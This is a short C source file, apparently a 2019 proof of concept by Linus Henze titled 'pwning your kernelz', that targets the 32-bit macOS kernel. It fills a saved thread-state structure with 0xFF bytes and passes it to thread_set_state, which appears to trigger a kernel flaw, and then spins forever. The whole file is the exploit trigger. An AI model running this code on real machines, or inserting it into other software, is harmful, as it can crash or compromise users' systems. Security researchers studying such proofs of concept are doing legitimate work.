//
//  main.c
//  pwning your kernelz
//
//  Created by Linus Henze.
//  Copyright © 2019 Linus Henze. All rights reserved.
//

//
// THIS IS 32 BIT ONLY, USE XCODE 9.4.1
//

#include <stdio.h>
#include "definitions.h"

int main(int argc, const char * argv[]) {
    x86_saved_state32_t state;
    memset(&state, 0xFF, sizeof(x86_saved_state32_t));
    thread_set_state(mach_thread_self(), x86_SAVED_STATE32, (thread_state_t) &state, x86_SAVED_STATE32_COUNT);
    while (1) {}
    return 0;
}
